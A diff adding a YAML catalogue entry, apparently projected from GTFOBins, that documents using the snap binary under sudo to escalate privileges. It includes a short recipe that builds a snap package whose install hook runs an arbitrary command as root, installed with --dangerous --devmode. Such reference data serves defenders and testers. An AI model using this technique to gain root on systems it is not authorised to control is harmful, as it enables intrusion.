@@ -1,0 +1,105 @@
+id: gtfobins/snap/command/sudo
+type: binary
+platform: linux
+name: snap
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: snap install xxxx_1.0_all.snap --dangerous --devmode
+  comment: 'Generate the Snap package with [fpm](https://github.com/jordansissel/fpm) and upload it to
+    the target.
+
+
+    ```
+
+    mkdir -p meta/hooks
+
+    echo -e ''#!/bin/sh\n/path/to/command; false'' >meta/hooks/install
+
+    chmod +x meta/hooks/install
+
+    fpm -n xxxx -s dir -t snap -a all meta
+
+    ```'
+references:
+- https://gtfobins.github.io/gtfobins/snap/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        snap:
+          functions:
+            command:
+            - code: snap install xxxx_1.0_all.snap --dangerous --devmode
+              comment: 'Generate the Snap package with [fpm](https://github.com/jordansissel/fpm) and
+                upload it to the target.
+
+
+                ```
+
+                mkdir -p meta/hooks
+
+                echo -e ''#!/bin/sh\n/path/to/command; false'' >meta/hooks/install
+
+                chmod +x meta/hooks/install
+
+                fpm -n xxxx -s dir -t snap -a all meta
+
+                ```'
+              contexts:
+                sudo: null
+    upstream_url: https://gtfobins.github.io/gtfobins/snap/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:11e4d228f3b657bc5ad92d6264c84abda80aad9d47922245535f43293a3e9325
